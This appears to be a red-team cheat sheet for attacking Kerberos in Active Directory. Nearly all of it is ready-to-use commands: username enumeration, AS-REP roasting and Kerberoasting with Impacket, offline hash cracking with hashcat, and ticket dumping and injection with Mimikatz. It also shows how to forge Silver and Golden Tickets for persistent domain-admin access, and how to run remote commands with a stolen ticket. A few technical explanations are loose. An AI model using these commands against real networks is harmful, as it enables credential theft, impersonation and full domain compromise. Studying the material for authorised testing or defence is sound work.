```table-of-contents
```
**Kerberos** is an authentication protocol widely used in **Active Directory (AD) environments** to provide secure authentication between users and services. It operates over **TCP/UDP port 88** and relies on **tickets** to grant access without sending passwords across the network.

## Common Attack Vectors

- **User Enumeration** – Identifying valid usernames via Kerberos requests.
- **Credential Attacks** – Exploiting **Kerberoasting** and **ASREPRoasting** to extract password hashes.
- **Pass-the-Ticket (PTT)** – Using stolen **TGT** (Ticket Granting Ticket) or **TGS** (Ticket Granting Service) to impersonate users.
- **Golden & Silver Tickets** – Creating **persistent backdoor access** in AD by forging Kerberos tickets.

**Bookmarks:**
[https://github.com/fortra/impacket](https://github.com/fortra/impacket)
## Enumeration
### Banner Grabbing
```bash
nmap -p 88 -sV --script=krb5-enum-users,krb5-info <target-ip>
```

If Kerberos is running on a Windows Server, the target is likely a **Domain Controller**.
#### Enumerating the DC
If LDAP is open (389), retrieve DC information:
```bash
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com" | grep -i "dc="
```
## Authentication Attacks
### Enumerate Valid Usernames
```bash
./kerbrute userenum -d <domain> --dc <target-ip> userlist.txt
```

Note: `kerbrute` file located in Cracks

## Pre-Authentication Bruteforce (AS-REP Roasting)
**ASREPRoasting** targets accounts with **Do not require Kerberos pre-authentication** enabled, allowing attackers to **extract AS-REP hashes** for offline cracking.
```bash
GetNPUsers.py -dc-ip <target-ip> -usersfile userlist.txt -format hashcat <domain>/ -outputfile asrep-hashes.txt
```

https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py

Cracking hashes:
```bash
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Check for AS-REP Roastable Accounts
```powershell
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object { $_.DoesNotRequirePreAuth -eq $true }
```

## Kerberoasting (Extracting TGS Tickets for Cracking)
**Kerberoasting** exploits **misconfigured service accounts** to extract **TGS tickets**, which contain NTLM hashes crackable offline.
### Enumerate Service Accounts
```powershell
Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-NetUser -SPN
```

### Request a TGS Ticket
```bash
GetUserSPNs.py -dc-ip <target-ip> <domain>/<user>:<password> -outputfile tgs-tickets.txt
```

#### Cracking the Ticket hash using Hashcat
```bash
hashcat -m 13100 tgs-tickets.txt rockyou.txt --force
```

## Pass-the-Ticket (Using Captured TGT/TGS)
If you obtain a TGT/TGS, use Mimikatz to inject and authenticate without knowing the password.
### Extract and Inject a Ticket
```bash
mimikatz
sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>
```
Once injected, access the target service without credentials.

## Silver Ticket Attack
A Silver Ticket allows an attacker to forge TGS tickets for specific services.

### Forge a Silver Ticket with Mimikatz
```
mimikatz
kerberos::golden /domain:<domain> /sid:<SID> /target:<dc-ip> /service:cifs /rc4:<NTLM-hash>
```
A forged Silver Ticket grants persistent access to services like SMB, RDP, or MSSQL.

## Golden Ticket Attack (Full Domain Control)
A Golden Ticket allows an attacker to forge any Kerberos ticket and gain domain admin access.
### Generate a Golden Ticket
```
mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<NTLM-hash> /ticket:<golden-ticket.kirbi>
```

Once created, inject the ticket:
```
kerberos::ptt golden-ticket.kirbi
```

## Tools Quick Reference

GetUserSPNs.py (Kerberoasting):
```
GetUserSPNs.py <DOMAIN>/<user>:<pass> -request -dc-ip <target-ip>
```

GetNPUsers.py (ASREPRoasting):
```
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <target-ip>
```

Pass-the-ticket (Impacket example)**:
```
export KRB5CCNAME=user.ccache 
impacket-smbexec -k -no-pass <DOMAIN>/<user>@<target-ip>
```